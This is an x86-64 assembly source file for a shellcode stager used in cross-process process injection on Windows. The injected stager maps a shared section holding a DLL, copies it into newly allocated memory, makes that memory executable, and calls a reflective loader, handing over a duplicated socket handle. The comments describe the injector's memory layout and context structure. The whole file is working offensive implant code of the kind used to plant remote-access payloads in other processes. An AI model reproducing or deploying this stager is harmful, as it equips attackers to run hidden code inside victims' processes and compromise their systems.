    .intel_syntax noprefix

    #
    # stager_x64.S — Lightweight staged injection stager.
    #
    # This position-independent shellcode is injected cross-process
    # (only ~200 bytes via WriteProcessMemory) and receives a full
    # DLL via an anonymous shared-memory section whose handle was
    # duplicated into this process by the injector.
    #
    # Layout in remote memory:
    #   [stager code: ~170 bytes][stager_context_t: ~64 bytes]
    #
    # The context is placed immediately after the code bytes.
    # The stager locates it via RIP-relative addressing.
    #
    # stager_context_t layout (all QWORD unless noted):
    #   +0x00  pfnMapViewOfFile         (kernel32)
    #   +0x08  pfnVirtualAlloc          (kernel32)
    #   +0x10  pfnVirtualProtect        (kernel32)
    #   +0x18  pfnUnmapViewOfFile       (kernel32)
    #   +0x20  pfnCloseHandle           (kernel32)
    #   +0x28  dwDllSize                (DWORD)
    #   +0x2C  dwLoaderOffset           (DWORD)
    #   +0x30  hDllSection              (HANDLE — duplicated)
    #   +0x38  hDupSocket               (HANDLE — duplicated socket)
    #

    .global stager_x64_start
    .global stager_x64_end

    .text

stager_x64_start:

    push rbx
    push r12
    push r13
    push r14
    push rsi
    push rdi
    sub  rsp, 0x68                          # shadow space + locals

    # Self-locate context (appended right after this code)
    lea  rbx, [rip + .Lcontext]

    # --- MapViewOfFile(hDllSection, FILE_MAP_READ, 0, 0, 0) ---
    mov  rcx, qword ptr [rbx + 0x30]       # hDllSection (duplicated handle)
    mov  edx, 4                             # FILE_MAP_READ
    xor  r8d, r8d
    xor  r9d, r9d
    mov  qword ptr [rsp + 0x20], 0          # dwNumberOfBytesToMap
    call qword ptr [rbx + 0x00]             # pfnMapViewOfFile
    test rax, rax
    jz   .Lexit
    mov  r12, rax                           # r12 = pView (raw DLL bytes)

    # --- VirtualAlloc(NULL, dwDllSize, MEM_COMMIT|MEM_RESERVE, PAGE_RW) ---
    xor  ecx, ecx
    mov  edx, dword ptr [rbx + 0x28]        # dwDllSize
    mov  r8d, 0x3000                         # MEM_COMMIT | MEM_RESERVE
    mov  r9d, 0x04                           # PAGE_READWRITE
    call qword ptr [rbx + 0x08]             # pfnVirtualAlloc
    test rax, rax
    jz   .Lunmap
    mov  r13, rax                           # r13 = local buffer

    # --- Copy DLL from section view to local buffer ---
    mov  rdi, r13                           # dest
    mov  rsi, r12                           # src (section view)
    mov  ecx, dword ptr [rbx + 0x28]        # count = dwDllSize
    cld
    rep  movsb

    # --- VirtualProtect(buffer, dwDllSize, PAGE_EXECUTE_READ, &oldProt) ---
    mov  rcx, r13
    mov  edx, dword ptr [rbx + 0x28]
    mov  r8d, 0x20                           # PAGE_EXECUTE_READ
    lea  r9,  [rsp + 0x40]                  # &oldProt on stack
    call qword ptr [rbx + 0x10]             # pfnVirtualProtect

    # --- Call _DllInit(hDupSocket) ---
    #
    # _DllInit accepts a UINT_PTR parameter and passes it through
    # to DllMain as lpReserved, carrying the duplicated socket handle.
    mov  rcx, qword ptr [rbx + 0x38]        # hDupSocket → first arg
    mov  eax, dword ptr [rbx + 0x2C]        # dwLoaderOffset
    add  rax, r13                           # rax = _DllInit VA
    call rax                                # → maps DLL → DllMain

.Lunmap:
    # --- UnmapViewOfFile(pView) ---
    mov  rcx, r12
    call qword ptr [rbx + 0x18]             # UnmapViewOfFile

    # --- CloseHandle(hDllSection) ---
    mov  rcx, qword ptr [rbx + 0x30]
    call qword ptr [rbx + 0x20]             # CloseHandle

.Lexit:
    add  rsp, 0x68
    pop  rdi
    pop  rsi
    pop  r14
    pop  r13
    pop  r12
    pop  rbx
    ret

    # Context lives right here — injector writes stager_context_t
    # at this offset after copying the code bytes.
.Lcontext:

stager_x64_end: